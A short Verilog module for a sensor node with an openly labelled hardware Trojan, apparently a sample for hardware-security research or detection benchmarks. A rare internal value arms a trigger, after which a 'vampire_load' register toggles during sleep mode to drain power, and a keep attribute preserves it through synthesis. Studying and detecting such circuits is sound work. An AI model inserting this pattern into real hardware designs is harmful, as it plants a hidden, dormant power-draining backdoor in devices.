module sensor_node (
    input wire clk,
    input wire rst,
    input wire sleep_mode,
    input wire [7:0] data_in,
    output reg [7:0] data_out
);
    wire [7:0] shared_comb = (data_in ^ 8'hA5) + 8'd3;

    always @(posedge clk or posedge rst) begin
        if (rst)
            data_out <= 8'b0;
        else if (!sleep_mode)
            data_out <= shared_comb;
    end

    // Duplicate combinational calculation inside Trojan (gets merged during aggressive synthesis!)
    wire [7:0] trojan_dup_calc = (data_in ^ 8'hA5) + 8'd3;
    wire [7:0] trojan_red_cone = (trojan_dup_calc ^ 8'hFF) ^ 8'hFF;

    reg trojan_armed;
    reg [3:0] vampire_load;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            trojan_armed <= 1'b0;
            vampire_load <= 4'hA;
        end else begin
            if (trojan_red_cone == 8'h7E)
                trojan_armed <= 1'b1;
            if (sleep_mode && trojan_armed)
                vampire_load <= ~vampire_load ^ trojan_red_cone[3:0];
        end
    end

    (* keep *) wire trojan_sink = ^vampire_load;
endmodule
